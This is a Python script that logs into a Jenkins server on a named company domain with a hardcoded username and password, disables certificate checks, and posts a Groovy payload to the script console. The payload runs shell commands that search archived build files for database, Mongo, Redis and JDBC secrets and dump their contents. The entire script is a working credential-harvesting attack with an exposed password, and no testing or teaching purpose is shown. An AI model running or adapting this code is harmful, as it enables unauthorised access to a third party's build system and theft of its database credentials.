import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx)
)

req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
crumb = json.loads(opener.open(req, timeout=15).read().decode())

GROOVY = r'''def r = ["bash","-c","""find /var/jenkins_home/jobs -path '*/archive*' \\( -name '*.env' -o -name '*.php' -o -name '*.properties' -o -name '*.yml' \\) 2>/dev/null | xargs grep -il 'DB_HOST\\|DB_PASSWORD\\|MONGO\\|REDIS\\|jdbc\\|datasource' 2>/dev/null | head -20
echo '---SEP---'
for f in \$(find /var/jenkins_home/jobs -path '*/archive*' \\( -name '*.env' -o -name '*.properties' \\) 2>/dev/null | xargs grep -il 'DB_HOST\\|DB_PASSWORD\\|MONGO\\|REDIS' 2>/dev/null | head -10); do echo "=== \$f ==="; cat "\$f" 2>/dev/null; done"""].execute().text
println r'''

data = urllib.parse.urlencode({'script': GROOVY}).encode()
req2 = urllib.request.Request(
    BASE + '/scriptText',
    data=data,
    headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb']
    }
)
resp = opener.open(req2, timeout=120).read().decode()
print(resp)
